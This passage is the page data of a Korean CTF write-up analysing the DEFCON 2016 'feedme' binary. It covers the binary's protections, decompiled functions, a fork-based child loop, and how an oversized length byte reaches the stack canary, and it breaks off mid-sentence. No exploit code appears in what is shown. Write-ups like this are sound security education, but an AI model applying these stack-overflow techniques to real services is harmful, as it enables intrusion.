{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/defcon2016_feedme_ctf_writeup/",
    "result": {"data":{"cur":{"id":"2ad538d1-c67f-5aac-b533-04c58de3bf2b","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAmUlEQVQI11XG2wqCMAAAUH+klN3UqbMtnc05LCudjYSSop76/7+IIIjgPBxvcK/BzXZ6dOM8Ts+9vdrzvXc30zndWrNzvGzpSmVcx6zK1ybJVcw2KVcZt57Uh8roWpZ9owtZRmkaM4Yp9RH0MfIxCjBeQvgPLUAASOEJecnEkVJdiq2IdUTqACtAahg1H6GGYfP9jwGhIsnpDQmNI7v/hJRFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/58cf3fddb230a4806e842b381299afb8/37523/0.png\"\n        srcset=\"/static/58cf3fddb230a4806e842b381299afb8/e9ff0/0.png 180w,\n/static/58cf3fddb230a4806e842b381299afb8/f21e7/0.png 360w,\n/static/58cf3fddb230a4806e842b381299afb8/37523/0.png 720w,\n/static/58cf3fddb230a4806e842b381299afb8/a8417/0.png 941w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>보호 기법</p>\n<ul>\n<li>stripped</li>\n<li>statically linked</li>\n<li>32 bit</li>\n</ul>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<ul>\n<li>No RELRO</li>\n<li>Canary found</li>\n<li>NX enabled</li>\n<li>PIE disabled</li>\n</ul>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqklEQVQY053LORKCMABA0dxDkGwsAcEgiQECYREQKZSx8f43cYbCwk5nXvGbD6blZS5P3dyrdq27VTcPVS0in8/lwuVwUhMXQypHUdxYXHM5JFkvijk6mlSOoJuuZ21UWSttRK65UFyoIOYRz4KEW5BYiG6ITVwbExvTHSQ2di1EQV412D84NHAoc2iwJz50GfJC5IXQC6HLPhz63aA0HfLCbf4Z0G3/9/wGiM0yplEohccAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/11625927a76f72f4a6ec20acec8cc1e8/37523/1.png\"\n        srcset=\"/static/11625927a76f72f4a6ec20acec8cc1e8/e9ff0/1.png 180w,\n/static/11625927a76f72f4a6ec20acec8cc1e8/f21e7/1.png 360w,\n/static/11625927a76f72f4a6ec20acec8cc1e8/37523/1.png 720w,\n/static/11625927a76f72f4a6ec20acec8cc1e8/9f82e/1.png 820w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>로직 분석1</p>\n<ul>\n<li><code class=\"language-text\">feedme</code> 바이너리의 입력 값으로 <code class=\"language-text\">A</code> 를 <code class=\"language-text\">0x41</code> 입력한 결과 SSP가 켜지는 것을 확인할 수 있으며 해당 바이너리에는 카나리가 존재하는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAe0lEQVQI12Pw8E1ycPHVMbTW0rcEIytNPQttfUttMFdD11xLz1JDx0zH0FpVy0RD10Jdx1zbwFJN20xdx5zBwyfaxsFZXlldRlFFVkkVD5JTVkNmyymrMbh5RVja2SmoasirqONGakgkXESNwcs/zd7ZT1nDRFHNiFQEAO1yKAWTkLwOAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/8a0c14e4baea697b61cf6107a4ad1355/37523/2.png\"\n        srcset=\"/static/8a0c14e4baea697b61cf6107a4ad1355/e9ff0/2.png 180w,\n/static/8a0c14e4baea697b61cf6107a4ad1355/f21e7/2.png 360w,\n/static/8a0c14e4baea697b61cf6107a4ad1355/37523/2.png 720w,\n/static/8a0c14e4baea697b61cf6107a4ad1355/9d76a/2.png 829w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>로직 분석2</p>\n<ul>\n<li>하지만 <code class=\"language-text\">feedme</code> 바이너리의 입력 값으로 <code class=\"language-text\">A</code>를 <code class=\"language-text\">0x40</code> 번 입력한 결과 SSP 켜지지 않는 것으로 보아 앞의 첫 바이트의 입력 값이 해당 다음 입력 값 즉, 문자열의 길이 값이 되는 것을 추측할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQI13XGQY6DIBQAUE/STFIdBcSP8EGEgkrV1jRt2qaLuf9JJh6gyVu8zJ5uMb1Dek7LZ9n+YnpJM6O9YH/hchTqXIso8FwyW5BuR22+x+YEMzckN6Q+jqr32gXjg3ZBWQ/Y1S02ylBoAbuqBgqy4sCEKjmQ/Szz49qHZPyINv4y4NJw2VVcUlAUFAFFGskEkkaWvKWATOha6JK1x4pk8/W+Pd7r7TnNW5hW4wY/LULbgjU/BfmOHvL8HzDAMCsdUW30AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/7d8e3ef1f2c06de1ff2d556400940e4a/37523/3.png\"\n        srcset=\"/static/7d8e3ef1f2c06de1ff2d556400940e4a/e9ff0/3.png 180w,\n/static/7d8e3ef1f2c06de1ff2d556400940e4a/f21e7/3.png 360w,\n/static/7d8e3ef1f2c06de1ff2d556400940e4a/37523/3.png 720w,\n/static/7d8e3ef1f2c06de1ff2d556400940e4a/f2d92/3.png 1027w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>systemcall</p>\n<ul>\n<li>system 호출 범위를 분석하던 중 <code class=\"language-text\">SIGCHILD</code> 시그널을 보낸 후 <code class=\"language-text\">write</code> 함수를 바탕으로 <code class=\"language-text\">Child exit</code> 출력을 하는 것을 확인할 수 있으며 다시 자식 프로세스를 생성하는 것을 확인할 수 있다. 이로 인해 해당 바이너리는 <code class=\"language-text\">fork</code> 함수를 바탕으로 자식 프로세스를 생성하는 로직을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 520px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 77.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAABxUlEQVQoz41Ty27bMBD0//9OTkEOya0FEhewK8SGJMuyLIsSRdKmSPH9KBS1RdA4jYkBwcPOzO6QXDw/o5cXtF5fINT7vc0ys9tZQgzsdd9rCPXxaMrSVJWpa3M4TIeuMwhNWACgEQoYhxCilNYYr7Wz1sUb1mIYbIwxhAnbba+UrY9DXqAj7KmiXPOPnLk4hHfkGGPTMGM9wbJqUEF2Z3Ghknof5o6McUJYY9wV5xhjWZ6d8wCwJIFty6uSlRU5ka5HnDGF8VjXlBBxnZznRAjTdWy5bJKkyzJMqWw50NZyFoX4fOa5bSnNOLq21ZzbYVCMamWV1p7SyPnvsuvkNMXWutOJvb6i/f6c/ISrTYXYWTn1J6rgvb+adgCAhRAh5GmKMBaHA93kpyMC2qn4pm6tlVLOKh9nxlo7ANh63eY5bho2jmrUygf3xT3HGKuKKmUxFnlONpt+9r/pkbyRL1o7jEWa4t3u3LbcGO//Sek9mdKJPKeQZWQYVN+Pyx/1t++HqqJ/db90Dk1Dx1FKaRmXLtoYovPBf44FpS6EOAyTeVGIotDupk/x5nx3B+7vwcMDXK3Y46N4ehqThG+3fLOd9v/jFy22lSwJEdTQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/6697a2c2b8d19ca8f31b9959bf080b46/69902/4.png\"\n        srcset=\"/static/6697a2c2b8d19ca8f31b9959bf080b46/e9ff0/4.png 180w,\n/static/6697a2c2b8d19ca8f31b9959bf080b46/f21e7/4.png 360w,\n/static/6697a2c2b8d19ca8f31b9959bf080b46/69902/4.png 520w\"\n        sizes=\"(max-width: 520px) 100vw, 520px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>main 함수 분석</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n<span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">ssignal</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> sub_8048E24<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">alarm</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x96u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">sub_804F820</span><span class=\"token punctuation\">(</span>off_80EA4BC<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">sub_80490B0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>main 함수 내부에서는 <code class=\"language-text\">alarm</code>, <code class=\"language-text\">ssignal</code>, <code class=\"language-text\">setvbuf</code> 함수를 바탕으로 기본적인 초기화 과정을 거치며 <code class=\"language-text\">sub_80490B0</code> 함수를 호출하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"sub_80490b0-함수-분석\" style=\"position:relative;\"><a href=\"#sub_80490b0-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_80490b0 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_80490B0 함수 분석</h2>\n<ul>\n<li><code class=\"language-text\">sub_80490B0</code> 함수를 <code class=\"language-text\">solve</code> 라 명칭하겠다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABvUlEQVQoz2WR6ZIaMQyE5/0fMJUsu1vAMBdz+D4ky1JqCEsBcenf57Zb3c316tp2HUdjbXGOvCfn7nM82r438xysLca8U+eoOZ22cYzDEJeFjJGcpRRhFhFZ13Q8bpeL6fuwrvUfrVUepzmflr4PlzZOA0xT0VqslRj3e+MYv7/nrovLwusq8yxK3fXM+zQRKhJXESDGwrXy42Fri/cAUIkYgADqM91/dn8Gc1jU73n71aXZlidX6wpaY4zZe1jXnBKW8iqOg1mOYfoM9uIk4zO7RViUwmUpOb3I7mLj+ftUTx0NxmxJ6aQt2JRLKRwTaU3nNo9a6byZbBzalKj82GtiQK0wBkaoORPRDvgW960bNIaCFwROiQDoQXdxCDRNteuzT9nHBFiebRtD8wLD7HzMKZXyHMlu2/DnQdoL6GCgJiz0YCEUtck0h4AOK75FfbMdS0o1RqRamblyfbgyBkPAnGuIULnuRb3KG+fk40NOZ7ia2aN32SPS4+dtk+5qVFo9OJ/De899z4cPOfdWZx0w0t4k/+xM7aV+ta6bVYTM/5XVxCjOSYylMrEwUS3lnplSCMCIAkC8L/O+818mDywZmPR0wQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/2a8f1592256c22c46abb4254b448d784/37523/5.png\"\n        srcset=\"/static/2a8f1592256c22c46abb4254b448d784/e9ff0/5.png 180w,\n/static/2a8f1592256c22c46abb4254b448d784/f21e7/5.png 360w,\n/static/2a8f1592256c22c46abb4254b448d784/37523/5.png 720w,\n/static/2a8f1592256c22c46abb4254b448d784/f1d1f/5.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_80490B0</p>\n<ul>\n<li><code class=\"language-text\">0x31F</code> 반복을 돌면서 각각의 내부 조건을 수행하게 되는 것을 확인할 수 있다.</li>\n<li><code class=\"language-text\">sub_806CC70</code> 함수를 확인해 보면 내부적으로 __lib_fork 함수를 사용하는 것을 확인할 수 있으며 해당 부분에서 자식 프로세스를 생성하는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4klEQVQY0y2H0Y6DIBAA/f9vu5dL0+Y4q1VQBHYXsFCsluKl7SWTyUwl2ijq9fewnY9J85vXafHb4h/Jbcm/eO+W3Nsf3Jr8FmitTINtoznnkxSgpYPJ0ggoZqucnbx9LeFgSRrgABxRBAezV16OlUcS63AJ3fnaXELP49AHcfbtEGU7dyfLfmxd+6YLnLn6ROxEbIyTSEqZsbr2xowtyIsaGi4YHxgojoqj5laPkWDzfrE2kokEN4KAOqJZHN0nrPA44VcnvxkdWIF5L6U8HiXnkvOen/uz/PtDLvtz/3Re8x+AtRXIncJ+1wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/65cd5350cc7e3cb56386d42994f0a2de/37523/6.png\"\n        srcset=\"/static/65cd5350cc7e3cb56386d42994f0a2de/e9ff0/6.png 180w,\n/static/65cd5350cc7e3cb56386d42994f0a2de/f21e7/6.png 360w,\n/static/65cd5350cc7e3cb56386d42994f0a2de/37523/6.png 720w,\n/static/65cd5350cc7e3cb56386d42994f0a2de/bad1b/6.png 841w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>fork 함수</p>\n<h2 id=\"sub_804f700-feedme-함수-분석\" style=\"position:relative;\"><a href=\"#sub_804f700-feedme-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_804f700 feedme 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_804F700 [feedme] 함수 분석</h2>\n<ul>\n<li><code class=\"language-text\">sub_804F700</code> 함수를 feedme 로 명칭하겠다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABuUlEQVQoz12S6W7bMBCE9f5Pll9BnLhoncSt7NhSdVASKYmHeHwFVcAousAAxGI4O3sUZSmpa8kwaKbJotSGUpFlCWgdcC7SdZbLRdI0kq6bEUKjlGee//KMCVgb91xRVQu328gwOLrOYYzHe4iRR2Ty9SqpqgkhLF3n99z/PO8jRdMo2kbQdStC5IqwrqAUaJ32D1pH6nqibXradqLvA1JmZzDPIGXCOTAmUojeMYyaXjia1jGOnr7PThPWQgjsrbdt5hnU7KgqS9N4hHAMw7aLZeTCRXUP1K3l7XPgeFroe4s2DkiPVrLg1zXSiJVzJTiXK3KCZXE45x+8bcuCled0ijy/WI7fZ7re4lxC640Y00PwevV8fEa+/Zi512JfXm5RKfsQzQssbreN+91TVpJLLWk7wyAs6+ozYVdc15AuFx/r3z6U9RibQcZe2Cili0q5aEyIKaXoXIzFOOZ5BM5nuH3l4eZTcfwTKTuta01VBX79ZEfbaoxxhJDYNkgp4X2ieHoaeH6WvL4uvL0pPj5W3t9XTqclI+X38Tibslxe29a9CBEO47gd1jUcjIkHrcMOY8JhmvzhD4ZSsIlwhiWSAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/e7359106c06c98ffe43174a04ec4a34f/37523/7.png\"\n        srcset=\"/static/e7359106c06c98ffe43174a04ec4a34f/e9ff0/7.png 180w,\n/static/e7359106c06c98ffe43174a04ec4a34f/f21e7/7.png 360w,\n/static/e7359106c06c98ffe43174a04ec4a34f/37523/7.png 720w,\n/static/e7359106c06c98ffe43174a04ec4a34f/f1d1f/7.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>\nsub_804F700 함수</p>\n<ul>\n<li>v3, v4의 변수들은 <code class=\"language-text\">.bss</code> 섹션에 존재하는 것을 확인할 수 있으며 서로 <code class=\"language-text\">0x20</code> 차이가 난다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAABN0lEQVQY0z3NS1KDMAAAUI7cVZk63bQzduNlXOgF3Lhx0BJCCyYBgkD4BWjSBFpLHF14gDfP8t6Sg4OLqCuTsSvUVYxDKQmseD7UaS0r8fT4fLda73YPm839druz7fVyubbt1WKxtY4v2SfoGBYRnGQ1mmm69KrAdZd1PRNzKxiJIxqHwfF0GqZp1FpRmmgtGTtb4StAH+88YSLX11YaqTQbYpCrsmuTryYgGB4xIUEQNE3T9wPnPAzDtq0wri2EUoyQEMIYM99uxphRX9J0kEKVjBWMIYQOh4Pv+xBCz/OyLOu6vmkqQhorTcs8z5RSv3iejTHT9F2WUqmRc962LSHEdd39fu+6LoQwjmPOOaURQtXfjJGU8h9rfU3TQYgzY6woCowxAMBxHACA7/uU0r4fsoxiXP0AfIE7oPwYIaAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/5131db72b51927f1af07b2eda0f092da/37523/8.png\"\n        srcset=\"/static/5131db72b51927f1af07b2eda0f092da/e9ff0/8.png 180w,\n/static/5131db72b51927f1af07b2eda0f092da/f21e7/8.png 360w,\n/static/5131db72b51927f1af07b2eda0f092da/37523/8.png 720w,\n/static/5131db72b51927f1af07b2eda0f092da/f941f/8.png 736w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>차이</p>\n<ul>\n<li>해당 v4 변수를 canary로 명칭한 이유는 <code class=\"language-text\">gs:0x14</code> 주소의 카나리 값을 스택 버퍼와 